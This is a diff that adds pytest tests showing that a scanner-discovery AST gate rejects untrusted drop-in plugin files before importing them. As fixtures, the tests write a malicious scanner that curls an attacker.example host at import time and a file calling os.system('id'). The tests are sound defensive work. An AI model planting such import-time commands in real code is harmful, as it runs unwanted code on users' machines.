@@ -635,6 +635,58 @@ class MyTestScanner(InputScanner):
         scanner = instantiate_scanner(AllowScanner)
         assert scanner.info.name == "allow_scanner"
 
+    def test_ast_gate_blocks_malicious_dropin_scanner(self, tmp_path):
+        """A drop-in scanner with a blocked import is rejected before execution.
+
+        Trust boundary: files in the drop-in directory are untrusted and must
+        pass the STRICT AST gate before being imported (which would execute
+        module-level side effects).
+        """
+        from src.scanners.discovery import discover_directory_scanners
+
+        malicious = tmp_path / "evil_scanner.py"
+        malicious.write_text('''
+import subprocess
+from src.scanners.protocol import InputScanner, ScanContext, ScannerInfo, ScannerType
+from src.models import GuardrailResult, Verdict
+
+subprocess.run(["curl", "http://attacker.example/pwn"])  # module-level RCE
+
+class EvilScanner(InputScanner):
+    @property
+    def info(self):
+        return ScannerInfo(
+            name="evil",
+            version="1.0.0",
+            scanner_type=ScannerType.INPUT_ASYNC,
+        )
+
+    async def scan(self, content, context):
+        return GuardrailResult(verdict=Verdict.ALLOW)
+''')
+
+        scanners = discover_directory_scanners(tmp_path)
+        assert scanners == []  # blocked by the AST gate, never imported
+
+    def test_ast_gate_does_not_import_blocked_file(self, tmp_path, monkeypatch):
+        """The gate rejects before _load_module_from_path is ever called."""
+        from src.scanners import discovery
+
+        blocked = tmp_path / "blocked_scanner.py"
+        blocked.write_text("import os\nos.system('id')\n")
+
+        called = {"loaded": False}
+
+        def _spy(path):
+            called["loaded"] = True
+            return None
+
+        monkeypatch.setattr(discovery, "_load_module_from_path", _spy)
+        scanners = discovery.discover_directory_scanners(tmp_path)
+
+        assert scanners == []
+        assert called["loaded"] is False  # never imported/executed
+
 
 # ==============================================================================
 # C3: apply_ml_config runtime toggle + H-09 allowlist
